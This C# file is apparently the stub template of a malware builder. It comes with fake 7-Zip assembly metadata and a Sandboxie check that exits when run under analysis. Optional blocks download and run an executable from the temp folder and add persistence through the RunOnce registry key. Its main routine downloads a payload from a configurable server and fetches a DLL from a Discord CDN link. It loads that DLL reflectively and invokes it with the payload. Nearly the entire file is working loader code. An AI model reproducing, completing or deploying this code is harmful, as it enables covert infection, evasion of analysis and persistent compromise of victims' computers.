using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System.Data.OleDb;
using Microsoft.Win32;
using Microsoft.VisualBasic.CompilerServices;
using System.Threading;

//Default [assembly: AssemblyTitle("7z.sfx")]
//Default [assembly: AssemblyDescription("7z SFX")]
//Default [assembly: AssemblyCompany("Igor Pavlov")]
//Default [assembly: AssemblyProduct("7-Zip")]
//Default [assembly: AssemblyCopyright("Copyright (c) 1999-2010 Igor Pavlov")]
//Default [assembly: AssemblyFileVersion("9.1.55.0")]


//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]

namespace %2%
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        /// 



    //sandboxie [DllImport("kernel32.dll")]
    //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
    //sandboxie static void controlsandboxie()
    //sandboxie {
    //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
    //sandboxie     {
    //sandboxie        Environment.Exit(1);
    //sandboxie     }
    //sandboxie }

        [STAThread]
        private static void Main(string[] args)
		{
 
            //Sleep System.Threading.Thread.Sleep(%Sleep%);

			//sandboxie controlsandboxie();

			//Messega

			//download try
			//download {
			//download  System.Net.WebClient appyrun = new System.Net.WebClient();
			//download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
			//download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
			//download }
			//download catch
			//download {
			//download }

             
            //start {
            //start  int %36% = Conversions.ToInteger("1"); 
            //start   if ((double)%36% != Conversions.ToDouble("1") || Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "%Name%", (object)null) != null)return;
            //start  string %37% = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\%FolderName%\\%Startup File Name%";
            //start   if (!Directory.Exists(Path.GetDirectoryName(%37%)))
            //start   {
            //start   Directory.CreateDirectory(Path.GetDirectoryName(%37%));
            //start   File.Copy(Application.ExecutablePath, %37%, true);
            //start   }
            //start   Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "%Name%", (object)%37%);    
            //start   }

            System.Net.ServicePointManager.SecurityProtocol =

            SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;

            System.Net.WebClient gunaresiseform1 = new System.Net.WebClient();

            Uri panel1 = new Uri("%Server%");

            byte[] %2% = gunaresiseform1.DownloadData(panel1);

            object %3% = new object[] { %aPP%, string.Empty, %2%, true };

            Assembly %4%;

            string %7% = null;

            WebClient %6% = new WebClient();

            byte[] %5% = %6%.DownloadData(new Uri("https://cdn.discordapp.com/attachments/873670006070738958/873670031240753182/cyberprotect.dll"));

            %4% = AppDomain.CurrentDomain.Load(%5%);

            %4%.GetType("cyberprotect.cybermodule").InvokeMember("cyberrun", System.Reflection.BindingFlags.InvokeMethod, null, %7%, (object[])%3%);



		}

      
    }



}
